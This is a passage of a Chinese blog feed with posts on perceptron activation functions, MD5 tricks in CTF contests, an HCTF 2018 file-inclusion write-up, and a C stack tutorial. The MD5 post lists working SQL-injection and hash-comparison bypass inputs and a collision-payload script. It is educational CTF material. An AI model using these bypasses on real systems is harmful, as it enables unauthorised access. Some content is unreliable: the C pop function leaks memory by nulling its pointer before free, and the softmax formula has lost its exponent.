title="多层感知机的优势"></a>多层感知机的优势</h4><ul><li>多层感知机可以实现非线性空间</li><li>使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数</li></ul><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>定义：将输入信号的总和转换为输出信号的函数</p><ul><li><p>sigmoid函数：<br>$$<br>h(x) = \frac{1}{(1+e^{-x})}<br>$$</p></li><li><p>阶跃函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    y = x &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> y.astype(np.<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure></li><li><p>ReLU函数<br>$$<br>h(x)=<br>\begin{cases}<br>x    (x&gt;0)\<br>0    (x\leq0)\<br>\end{cases}<br>$$</p></li></ul><ul><li><p>恒等函数</p></li><li><p>softmax函数<br>$$<br>y_k=\frac{e^}{\sum_{i=1}^ne^{a_i}}<br>$$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关md5的一些信息</title>
      <link href="2021/11/23/something_about_md5/"/>
      <url>2021/11/23/something_about_md5/</url>
      
        <content type="html"><![CDATA[<p>在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种<a id="more"></a></p><h3>在sql注入中</h3><p>若遇到了类似以下的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br></pre></td></tr></table></figure><p>可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸</p><h3>在弱类型比较中</h3><p>若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;s1502113478a&quot;</span>;</span><br><span class="line">$b = <span class="string">&quot;s1836677006a&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents]</span><br><span class="line">└─$ php md5.php </span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">0e481036490867661113260034900752</span><br></pre></td></tr></table></figure><h3>在允许传递数组时</h3><p>可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>();</span><br><span class="line">$b = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents]</span><br><span class="line">└─$ php em_array.php </span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 5</span><br><span class="line">PHP Warning:  md5() expects parameter 1 to be string, array given <span class="keyword">in</span> /home/kali/Documents/em_array.php on line 6</span><br></pre></td></tr></table></figure><p>虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span> &amp; b[<span class="number">1</span>]=<span class="string">&quot;b&quot;</span> &amp; c[]</span><br></pre></td></tr></table></figure><h3>md5碰撞</h3><p>当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urlString1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">urlString2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>):</span><br><span class="line">    urlString1 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>):</span><br><span class="line">    urlString2 +=  urllib.parse.quote(line)</span><br><span class="line"></span><br><span class="line">print(urlString1)</span><br><span class="line">print(urlString2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018WarmUp 1</title>
      <link href="2021/11/07/%5BHCTF%202018%5DWarmUp%201/"/>
      <url>2021/11/07/%5BHCTF%202018%5DWarmUp%201/</url>
      
        <content type="html"><![CDATA[<p>一上来便是一张天真无邪的笑脸<a id="more"></a><br><a href="https://www.helloimg.com/image/ChSkgt"><img src="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/ChSkgt.png" srcset="data:image/png;base64,666" alt="ChSkgt.png"></a><br>无头绪，f12查源码，发现source.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>开始代码审计</p><p>网页通过对传入的参数进行过滤后进行文件包含</p><p>一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里</p><p>最终payload：</p><p><a href="https://www.helloimg.com/image/Chigu0"><img src="https://www.helloimg.com/images/2021/11/07/Chigu0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/Chigu0.png" srcset="data:image/png;base64,666" alt="Chigu0.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用C语言实现栈</title>
      <link href="2021/09/05/stack_by_C/"/>
      <url>2021/09/05/stack_by_C/</url>
      
        <content type="html"><![CDATA[<h2>说明</h2><ul>    <li>作为栈顶的节点不存储数据<a id="more"></a>，仅作定位功能</li>    <li>数据项的类型可自行定义</li>    <li>在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已</li>    <li>栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现</li>    <li>主函数仅作各函数的演示使用，可自定义</li></ul><h2>定义相应结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br></pre></td></tr></table></figure><p>该结构由一个整型和一个指向此结构的指针组成。</p><h2>定义push函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line">    top-&gt;data++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>第一步：分配空间</li>    <li>第二步：存储数据</li>    <li>第三步：改变栈顶和新增项的next指针，递增top节点的data项</li></ul><h2>定义pop函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>第一步：判断栈是否为空</li>    <li>第二步：定义变量存储待弹出的数据和待删除节点</li>    <li>第三步：改变栈顶的next指针</li>    <li>释放待删除节点空间，删除节点</li></ul><h2>定义初始化函数</h2><ul>    <li>为栈顶节点分配空间并初始化指针为空</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2>定义遍历显示函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>将当前节点指向栈顶的下一个节点</li>    <li>当前节点不为空时进入遍历循环</li>    <li>打印当前节点的数据项</li>    <li>将当前节点指向下一个节点</li></ul><h2>源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>;</span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first_input;</span><br><span class="line"><span class="keyword">int</span> pop_input, pop_data;</span><br><span class="line">node *top = stack_init();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter strings, 